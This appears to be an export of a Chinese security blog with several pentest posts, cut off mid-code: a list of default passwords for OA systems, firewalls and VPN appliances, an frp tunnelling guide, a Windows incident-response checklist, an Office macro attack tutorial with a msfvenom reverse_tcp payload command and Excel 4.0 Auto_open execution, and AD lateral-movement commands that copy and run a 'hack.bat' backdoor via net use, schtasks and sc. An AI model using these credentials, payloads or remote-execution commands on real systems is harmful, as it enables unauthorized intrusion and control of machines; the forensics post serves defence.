    <url>/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试过程中，最常见的情况就是遇到弱口令得到入口从而攻陷整个系统，由于很多系统管理员缺少安全意识，口令往往是系统默认设置的口令。本文总结了常见的系统默认口令以及默认口令在线查询网站。</p><h2 id="OA"><a href="#OA" class="headerlink" title="OA"></a>OA</h2><h3 id="致远OA"><a href="#致远OA" class="headerlink" title="致远OA"></a>致远OA</h3><p>1、system用户（默认密码：system，对应A8的系统管理员、A6的单位管理员）</p><p>2、group-admin（默认密码：123456，对应A8集团版的集团管理员）</p><p>3、admin1（默认密码：123456，对应A8企业版的单位管理员）</p><p>4、audit-admin（默认密码：123456，对应审计管理员） </p><h3 id="泛微OA"><a href="#泛微OA" class="headerlink" title="泛微OA"></a>泛微OA</h3><p>用户名:sysadmin 密码:1</p><h2 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h2><h3 id="常见安全设备"><a href="#常见安全设备" class="headerlink" title="常见安全设备"></a>常见安全设备</h3><p>天融信防火墙 用户名:superman 密码:talent</p><p>天融信防火墙 用户名:superman 密码:talent!23</p><p>联想网御防火墙 用户名:admin 密码:leadsec@7766、administrator、bane@7766</p><p>深信服防火墙 用户名：admin 密码：admin</p><p>启明星辰 用户名：admin 密码：bane@7766 用户名：admin 密码：admin@123</p><p>juniper 用户名:netscreen 密码:netscreen</p><p>Cisco 用户名:admin 密码:cisco</p><p>Huawei 用户名:admin 密码:Admin@123</p><p>H3C 用户名:admin 密码:admin</p><p>绿盟IPS 用户名: weboper 密码: weboper</p><p>网神防火墙GE1 用户名：admin 密码：firewall</p><p>深信服VPN：51111端口 密码:delanrecover</p><p>华为VPN：账号：root 密码：mduadmin</p><p>华为防火墙：admin 密码:Admin@123</p><p>EudemonJuniper防火墙：netscreen netscreen</p><p>迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</p><p>山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</p><p>安恒的明御防火墙 admin/adminadmin</p><p>某堡垒机 shterm/shterm</p><p>天融信的vpn test/123456</p><p>阿姆瑞特防火墙admin/manager</p><p>明御WEB应用防火墙admin/admin</p><p>明御安全网关admin/adminadmin</p><p>天清汗马admin/veuns.fw audit/veuns.audit</p><p>网康日志中心ns25000/ns25000</p><p>网络安全审计系统（中科新业）admin/123456</p><p>LogBase日志管理综合审计系统admin/safetybase</p><p>中新金盾硬件防火墙admin/123</p><p>kill防火墙(冠群金辰)admin/sys123</p><p>黑盾防火墙admin/admin</p><h3 id="绿盟安全产品"><a href="#绿盟安全产品" class="headerlink" title="绿盟安全产品"></a>绿盟安全产品</h3><p>IPS入侵防御系统、SAS­H运维安全管理系统、SAS安全审计系统、DAS数据库审计系统、RSAS远程安全评估系统、WAF WEB应用防护系统、UTS威胁检测系统</p><p>sysauditor/sysauditor</p><p>sysmanager/sysmanager </p><p>supervisor/supervisor</p><p>maintainer/maintainer</p><p>webpolicy/webpolicy</p><p>sysadmin/sysadmin</p><p>conadmin/conadmin</p><p>supervis/supervis</p><p>webaudit/webaudit</p><p>sysadmin/sysadmin</p><p>conadmin/nsfocus</p><p>weboper/weboper</p><p>auditor/auditor</p><p>weboper/weboper</p><p>nsadmin/nsadmin</p><p>admin/nsfocus</p><p>admin/admin</p><p>shell/shell</p><h2 id="默认密码在线查询网站"><a href="#默认密码在线查询网站" class="headerlink" title="默认密码在线查询网站"></a>默认密码在线查询网站</h2><h3 id="CIRT-net"><a href="#CIRT-net" class="headerlink" title="CIRT.net"></a>CIRT.net</h3><p><a href="https://cirt.net/passwords">https://cirt.net/passwords</a></p><h3 id="默认密码列表"><a href="#默认密码列表" class="headerlink" title="默认密码列表"></a>默认密码列表</h3><p><a href="https://datarecovery.com/rd/default-passwords/">https://datarecovery.com/rd/default-passwords/</a></p><h3 id="工具猫路由器默认密码查询"><a href="#工具猫路由器默认密码查询" class="headerlink" title="工具猫路由器默认密码查询"></a>工具猫路由器默认密码查询</h3><p><a href="https://toolmao.com/baiduapp/routerpwd/">https://toolmao.com/baiduapp/routerpwd/</a></p><h3 id="路由器默认密码查询"><a href="#路由器默认密码查询" class="headerlink" title="路由器默认密码查询"></a>路由器默认密码查询</h3><p><a href="https://www.cleancss.com/router-default/">https://www.cleancss.com/router-default/</a></p><h3 id="Internet上最全面的默认路由器密码列表"><a href="#Internet上最全面的默认路由器密码列表" class="headerlink" title="Internet上最全面的默认路由器密码列表"></a>Internet上最全面的默认路由器密码列表</h3><p><a href="https://portforward.com/router-password/">https://portforward.com/router-password/</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>弱口令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网穿透工具frp</title>
    <link href="/2020/10/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7frp/"/>
    <url>/2020/10/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7frp/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>渗透渗透中面对的大部分目标除了暴露在互联网的部分，还有隐藏在内网的大量资产，这部分资产往往无法联通外网，很少暴露在攻击者面前，与此同时安全一般也没有外部资产做的全面 。如果我们从某一外部互联网入口成功进入了内网，就可以利用frp工具搭建起一个隧道，对这些资产进行测试。</p><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>通过release页面下载对应系统的压缩包解压即可</p><h2 id="基本使用介绍"><a href="#基本使用介绍" class="headerlink" title="基本使用介绍"></a>基本使用介绍</h2><h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># frps.ini</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = www.baidu.com<br></code></pre></td></tr></table></figure><p>使用如下命令开启服务器</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frps -<span class="hljs-keyword">c</span> frps.ini<br></code></pre></td></tr></table></figure><h3 id="客户端配置（socks5隧道）"><a href="#客户端配置（socks5隧道）" class="headerlink" title="客户端配置（socks5隧道）"></a>客户端配置（socks5隧道）</h3><p>配置客户端时，要注意common中的ip和端口指向服务器，token与服务器中保持一致，每个socks代理，需要单独起plugin_name，并使用不同的remote_port。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">tls_enable</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">token</span> = www.baidu.com<br><span class="hljs-attr">pool_count</span> = <span class="hljs-number">5</span>        <br><span class="hljs-attr">protocol</span> = tcp                <span class="hljs-comment">#协议类型</span><br><span class="hljs-attr">health_check_type</span> = tcp<br><span class="hljs-attr">health_check_interval_s</span> = <span class="hljs-number">100</span><br><span class="hljs-section">[socks-001]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">6666</span>            <span class="hljs-comment">#代理的端口</span><br><span class="hljs-attr">plugin</span> = socks5               <span class="hljs-comment">#使用的协议</span><br><span class="hljs-attr">plugin_user</span> = admin<br><span class="hljs-attr">plugin_passwd</span> = www.baidu.com<br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span>         <span class="hljs-comment">#是否加密</span><br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>使用如下命令开启客户端</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">普通模式：<br>frpc -<span class="hljs-keyword">c</span> frpc.ini<br>后台无回显模式：<br>nohup frpc -<span class="hljs-keyword">c</span> frpc.ini &amp;<br></code></pre></td></tr></table></figure><p>此时在proxyfire等代理工具中配置:</p><ul><li>ip为server_ip</li><li>port为remote_port</li><li>用户为plugin_user</li><li>密码为plugin_passwd</li></ul><p>即可将客户端网络作为代理出口使用</p><h3 id="客户端配置（web转发）"><a href="#客户端配置（web转发）" class="headerlink" title="客户端配置（web转发）"></a>客户端配置（web转发）</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># frpc.ini</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = www.baidu.com<br><span class="hljs-section">[web]</span><br><span class="hljs-attr">type</span> = http<br><span class="hljs-attr">local_port</span> = <span class="hljs-number">8080</span><br><span class="hljs-attr">custom_domains</span> = www.yourdomain.com<br></code></pre></td></tr></table></figure><h3 id="客户端配置（ssh转发）"><a href="#客户端配置（ssh转发）" class="headerlink" title="客户端配置（ssh转发）"></a>客户端配置（ssh转发）</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># frpc.ini</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = www.baidu.com<br><span class="hljs-section">[ssh]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">22</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">6000</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>frp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻击溯源的排查范围</title>
    <link href="/2020/09/15/%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E7%9A%84%E6%8E%92%E6%9F%A5%E8%8C%83%E5%9B%B4/"/>
    <url>/2020/09/15/%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E7%9A%84%E6%8E%92%E6%9F%A5%E8%8C%83%E5%9B%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在系统被入侵后，需要迅速梳理出黑客的攻击路径，本文总结windows系统攻击溯源过程中必要的排查范围。</p><h2 id="排查项目"><a href="#排查项目" class="headerlink" title="排查项目"></a>排查项目</h2><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><h4 id="查看当前登录用户"><a href="#查看当前登录用户" class="headerlink" title="查看当前登录用户"></a>查看当前登录用户</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">query <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure><h4 id="查看系统中所有用户"><a href="#查看系统中所有用户" class="headerlink" title="查看系统中所有用户"></a>查看系统中所有用户</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>. net user<br><span class="hljs-number">2</span>. 开始-运行-lusrmgr.msc<br><span class="hljs-number">3</span>.查看C:\Users目录排查是否新建用户目录，如果存在则排查对应用户的download和desktop目录是否有可疑文件<br></code></pre></td></tr></table></figure><h4 id="查看是否存在隐藏账号，克隆账号"><a href="#查看是否存在隐藏账号，克隆账号" class="headerlink" title="查看是否存在隐藏账号，克隆账号"></a>查看是否存在隐藏账号，克隆账号</h4><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">开始-运行-regedit<br>查看HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>AM<span class="hljs-symbol">\S</span>AM<span class="hljs-symbol">\D</span>omains<span class="hljs-symbol">\A</span>ccount<span class="hljs-symbol">\U</span>sers中是否有异常<br></code></pre></td></tr></table></figure><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><p>注册表查看启动项</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\H</span>KEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<br><br><span class="hljs-symbol">\H</span>KEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<br></code></pre></td></tr></table></figure><p>命令行查看启动项</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wmic startup list full</span><br></code></pre></td></tr></table></figure><p>组策略中查看启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">运行-gpedit.msc<br></code></pre></td></tr></table></figure><h3 id="Recent目录"><a href="#Recent目录" class="headerlink" title="Recent目录"></a>Recent目录</h3><p>此目录可以看到程序或文件最后被打开和使用的日期时间。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\A</span>dministrator<span class="hljs-symbol">\R</span>ecent<br></code></pre></td></tr></table></figure><h3 id="windows日志"><a href="#windows日志" class="headerlink" title="windows日志"></a>windows日志</h3><h4 id="安全日志"><a href="#安全日志" class="headerlink" title="安全日志"></a>安全日志</h4><p>计算机-管理-事件查看器-windows日志-安全(或eventvwr.msc)</p><p>根据时间排查安全日志里的登录事件，用户创建等事件情况</p><p>着重寻找登录事件(ID4624)且登录类型为3和10等远程登录方式</p><p>windows安全日志文件：C:\Windows\System32\winevt\Logs\Security.evtx 查看其大小是否为20M左右，若远远小于20M则有可能被清理过</p><h4 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h4><p>计算机-管理-事件查看器-windows日志-系统</p><p>查看恶意进程的运行状态时间等</p><h3 id="排查可疑进程"><a href="#排查可疑进程" class="headerlink" title="排查可疑进程"></a>排查可疑进程</h3><p>查看可疑网络连接</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">netstat</span> -<span class="hljs-keyword">b</span> -n<br></code></pre></td></tr></table></figure><p>根据网络连接寻找pid</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -ano <span class="hljs-string">| findstr xxx</span><br></code></pre></td></tr></table></figure><p>根据pid寻找进程</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">tasklist <span class="hljs-string">| findstr xxx</span><br></code></pre></td></tr></table></figure><p>杀死可疑进程</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">taskkill <span class="hljs-string">/T</span> <span class="hljs-string">/F</span> <span class="hljs-string">/PID</span> xxxx<br></code></pre></td></tr></table></figure><h3 id="排查计划任务"><a href="#排查计划任务" class="headerlink" title="排查计划任务"></a>排查计划任务</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/query</span> <span class="hljs-string">/fo</span> table <span class="hljs-string">/v</span><br><br>运行-taskschd.msc<br></code></pre></td></tr></table></figure><h3 id="排查系统服务"><a href="#排查系统服务" class="headerlink" title="排查系统服务"></a>排查系统服务</h3><figure class="highlight thrift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs thrift">运行-<span class="hljs-keyword">service</span>.msc<br></code></pre></td></tr></table></figure><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="PECmd"><a href="#PECmd" class="headerlink" title="PECmd"></a>PECmd</h3><p>使用PECmd导出最近活动项目</p><h3 id="LastActivityView"><a href="#LastActivityView" class="headerlink" title="LastActivityView"></a>LastActivityView</h3><p>使用LastActivityView图形化工具查看最近活动项目</p>]]></content>
    
    
    <categories>
      
      <category>攻击溯源</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻击溯源</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>office宏攻击</title>
    <link href="/2020/08/20/office%E5%AE%8F%E6%94%BB%E5%87%BB/"/>
    <url>/2020/08/20/office%E5%AE%8F%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>office宏攻击是钓鱼邮件场景中最常见的攻击手段，其制作简单，兼容性强，非常适合批量攻击，但由于其需要用户交互，隐蔽性差，攻击能否成功基本取决于目标的安全意识强弱。</p><h2 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h2><p>office宏病毒一般寄存于office文档中，如word，excel，ppt，以excel最常见，当用户打开这种文档时，内置的宏命令就会执行，在计算机中执行恶意命令。</p><p>一般的恶意命令会自动访问提前部署好的恶意服务器下载木马程序到本地并运行，从而控制计算机。</p><h2 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h2><h3 id="CobaltStrike生成office宏病毒"><a href="#CobaltStrike生成office宏病毒" class="headerlink" title="CobaltStrike生成office宏病毒"></a>CobaltStrike生成office宏病毒</h3><p>使用CobaltStrike的宏病毒生成功能可以轻松生成恶意宏代码，部署CobaltStrike服务器并打开客户端，创建一个监听器</p><p><img src="https://github.com/echohun/blog_image/blob/master/office/office_01.png?raw=true"></p><p>然后点击Attacks-Package-MS Office Macro-选定监听器-生成对应的宏病毒-复制到剪贴板</p><p><img src="https://github.com/echohun/blog_image/blob/master/office/office_02.png?raw=true"></p><p>然后创建一个新word-视图-查看宏中新建一个宏名</p><p><img src="https://github.com/echohun/blog_image/blob/master/office/office_03.png?raw=true"></p><p>在里面粘贴刚才复制的宏，并在保存时点击否另存为.doxm文件</p><p><img src="https://github.com/echohun/blog_image/blob/master/office/office_04.png?raw=true"></p><p><img src="https://github.com/echohun/blog_image/blob/master/office/office_05.png?raw=true"></p><p>当打开word文档并点击启用宏代码时，就会触发宏，反弹shell到Cobalt Strike中</p><h3 id="msf生成vba文件"><a href="#msf生成vba文件" class="headerlink" title="msf生成vba文件"></a>msf生成vba文件</h3><p>使用msf生成vba文件：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -<span class="hljs-selector-tag">i</span> <span class="hljs-number">5</span> lhost=xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span> lport=<span class="hljs-number">4444</span> -f vba -o <span class="hljs-number">123</span>.vba<br></code></pre></td></tr></table></figure><p>后面的步骤与CobaltStrike中相似，创建一个新word-视图-查看宏中新建一个宏名</p><p>在里面粘贴刚才复制的宏，并在保存时点击否另存为.doxm文件</p><p>当打开word文档并点击启用宏代码时，就会触发宏，反弹shell到msf中</p><h3 id="使用excel4-0宏执行命令"><a href="#使用excel4-0宏执行命令" class="headerlink" title="使用excel4.0宏执行命令"></a>使用excel4.0宏执行命令</h3><p>创建一个word或excel文档，如果是word需要插入excel工作表</p><p><img src="https://github.com/echohun/blog_image/blob/master/office/office_06.png?raw=true"></p><p>右键点击底部的sheet-插入，选择MS Excel 4.0宏表</p><p><img src="https://github.com/echohun/blog_image/blob/master/office/office_07.png?raw=true"></p><p>在表格中写入= EXEC(“calc.exe”)</p><p><img src="https://github.com/echohun/blog_image/blob/master/office/office_08.png?raw=true"></p><p>点击此格，将单元格命名为Auto_open，并可以将此sheet右键隐藏，重新打开word文档将会自动执行命令。</p><p><img src="https://github.com/echohun/blog_image/blob/master/office/office_09.png?raw=true"></p><h3 id="在excel中嵌入宏代码"><a href="#在excel中嵌入宏代码" class="headerlink" title="在excel中嵌入宏代码"></a>在excel中嵌入宏代码</h3><p>excel中可以直接嵌入dde指令，参考csv注入中的攻击方式即可。</p><p>参考文档：<br><a href="http://uuzdaisuki.com/2020/07/16/csv%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/07/16/csv%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>office</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ad域渗透命令执行总结</title>
    <link href="/2020/08/06/ad%E5%9F%9F%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/"/>
    <url>/2020/08/06/ad%E5%9F%9F%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>AD的全称是Active Directory：活动目录<br>域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后两个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><p>在域渗透场景中，我们已经进入内网，会遇到大量的开放端口和服务，弱密码空密码，这个时候我们可以使用它们已经开启的服务选择对应的方式进行命令执行。本文对ad域渗透中常见的命令执行方式进行一个总结。</p><h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc"></a>ipc</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>开启ipc共享</p><p>配置本地安全策略：开始-&gt;运行-&gt; secpol.msc-&gt;本地策略-&gt;安全选项-&gt;网络访问：共享&gt;和本地帐户的安全模型&gt;经典-本地用户进行身份验证</p><p>配置本地组策略：运行gpedit.msc ——计算机配置——Windows设置——安全设置——本地策略<br>——安全选项——用户账户控制：以管理员批准模式运行所有管理员——禁用。</p><h3 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">写入后门文件<br>net <span class="hljs-keyword">use</span> <span class="hljs-symbol">z:</span> \\目标IP\c<span class="hljs-variable">$ </span><span class="hljs-string">&quot;passwd&quot;</span> /<span class="hljs-symbol">user:</span><span class="hljs-string">&quot;admin&quot;</span><br>或<br>copy hack.bat \\目标ip\c$<br><span class="hljs-comment">#删除连接</span><br>net <span class="hljs-keyword">use</span> \\目标IP\ipc<span class="hljs-variable">$ </span>/del<br></code></pre></td></tr></table></figure><p>后续使用下面的方式执行</p><h2 id="at-win10不可用"><a href="#at-win10不可用" class="headerlink" title="at(win10不可用)"></a>at(win10不可用)</h2><p>定时任务执行命令</p><h3 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h3><p>开启windows Event log服务，开启Task Scheduler服务</p><p>其余条件同ipc</p><p>命令执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">170.170.64.19</span> <span class="hljs-number">23</span>:<span class="hljs-number">00</span> c:\windows\system<span class="hljs-number">32</span>\calc.exe<br><span class="hljs-attribute">at</span> \\<span class="hljs-number">170.170.64.19</span> <span class="hljs-number">1</span> delete /yes #删除本机<span class="hljs-number">1</span>号任务<br></code></pre></td></tr></table></figure><h2 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h2><h3 id="前提-2"><a href="#前提-2" class="headerlink" title="前提"></a>前提</h3><p>开启windows Event log服务，开启Task Scheduler服务</p><p>其余条件同ipc</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> firstTask <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;c:\windows\system32\cmd.exe /c calc&quot;</span> <span class="hljs-string">/sc</span> once <span class="hljs-string">/st</span> 00<span class="hljs-function">:00</span> <span class="hljs-string">/S</span> 170.170.64.19 <span class="hljs-string">/RU</span> System <span class="hljs-string">/u</span> admin <span class="hljs-string">/p</span> passwd<br>schtasks <span class="hljs-string">/run</span> <span class="hljs-string">/tn</span> firstTask <span class="hljs-string">/S</span> 170.170.64.19 <span class="hljs-string">/u</span> admin <span class="hljs-string">/p</span> passwd<br>schtasks <span class="hljs-string">/F</span> <span class="hljs-string">/delete</span> <span class="hljs-string">/tn</span> firstTask <span class="hljs-string">/S</span> 170.170.64.19 <span class="hljs-string">/u</span> admin <span class="hljs-string">/p</span> passwd<br></code></pre></td></tr></table></figure><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><h3 id="前提-3"><a href="#前提-3" class="headerlink" title="前提"></a>前提</h3><p>开启telnet服务</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">telnet</span> 目标<span class="hljs-built_in">ip</span><br>之后可执行命令<br></code></pre></td></tr></table></figure><h2 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx">windows2003<br><span class="hljs-attribute">windows</span> XP<br></code></pre></td></tr></table></figure><h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">sc <span class="hljs-string">\\170.170.64.19</span> create testSC binPath= <span class="hljs-string">&quot;cmd.exe /c start c:\windows\hack.bat&quot;</span><br>sc <span class="hljs-string">\\170.170.64.19</span> start testSC<br>sc <span class="hljs-string">\\170.170.64.19</span> <span class="hljs-keyword">delete</span> testSC<br></code></pre></td></tr></table></figure><h2 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h2><h3 id="前提-4"><a href="#前提-4" class="headerlink" title="前提"></a>前提</h3><p>开启wmi服务，135端口</p><h3 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 